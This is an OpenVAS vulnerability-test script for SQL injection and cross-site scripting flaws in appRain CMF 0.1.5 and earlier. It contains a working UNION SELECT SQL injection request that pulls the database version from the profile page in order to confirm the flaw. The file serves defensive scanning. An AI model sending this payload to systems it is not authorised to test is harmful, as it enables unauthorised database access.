##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apprain_sql_and_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# appRain CMF SQL Injection And Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "appRain CMF version 0.1.5 and prior";

tag_insight = "Multiple flaws are due to an input passed via
  - 'PATH_INFO' to quickstart/profile/index.php in the Forum module is not
    properly sanitized before being used in a SQL query.
  - 'ss' parameter in 'search' action is not properly verified before it is
    returned to the user.";
tag_solution = "No solution or patch is available as of 29th October, 2012. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.apprain.com/";
tag_summary = "This host is running appRain CMF and is prone to sql injection and
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(902690);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-5228", "CVE-2011-5229");
  script_bugtraq_id(51105);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-29 16:47:00 +0530 (Mon, 29 Oct 2012)");
  script_name("appRain CMF SQL Injection And Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/83186");
  script_xref(name : "URL" , value : "http://www.osvdb.org/83187");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71880");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71881");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18249/");

  script_description(desc);
  script_summary("Check if appRain is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP port
rainPort = get_http_port(default:80);
if(!get_port_state(rainPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:rainPort)){
  exit(0);
}

foreach dir (make_list("/appRain", "/apprain", "", cgi_dirs()))
{
  url = dir + "/profile/index.php";

  if(http_vuln_check(port:rainPort, url:url, pattern:"Start with appRain<",
                 check_header:TRUE, extra_check:make_list('>Profile','>Login')))
  {
    ## Construct the Attack Request
    url = dir + "/profile/-1%20union%20all%20select%201,2,3,CONCAT" +
          "(0x6f762d73716c2d696e6a2d74657374,0x3a,@@version,0x3a,0x6f762d7"+
          "3716c2d696e6a2d74657374),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--";

    ## Try attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:rainPort, url:url, pattern:"ov-sql-inj-test:[0-9]+.*:" +
                       "ov-sql-inj-test", check_header:TRUE,
                       extra_check:make_list('>Profile','Start with appRain<')))
    {
      security_hole(rainPort);
      exit(0);
    }
  }
}
